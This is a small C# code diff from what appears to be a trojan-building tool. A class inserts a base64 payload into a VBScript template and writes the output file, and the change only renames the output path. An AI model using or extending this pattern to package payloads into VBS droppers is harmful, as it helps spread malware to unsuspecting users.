@@ -22,9 +22,9 @@ public sealed class TroyanPlainVbsEmitter : ITroyanPlainVbsEmitter
             throw new InvalidOperationException("holder.vbs must contain the 0102 placeholder.");
 
         var vbs = template.Replace(placeholder, b64, StringComparison.Ordinal);
-        var dir = Path.GetDirectoryName(layout.TroyanPlainVbs);
+        var dir = Path.GetDirectoryName(layout.TroyanOutputVbs);
         if (!string.IsNullOrEmpty(dir))
             Directory.CreateDirectory(dir);
-        File.WriteAllText(layout.TroyanPlainVbs, vbs);
+        File.WriteAllText(layout.TroyanOutputVbs, vbs);
     }
 }
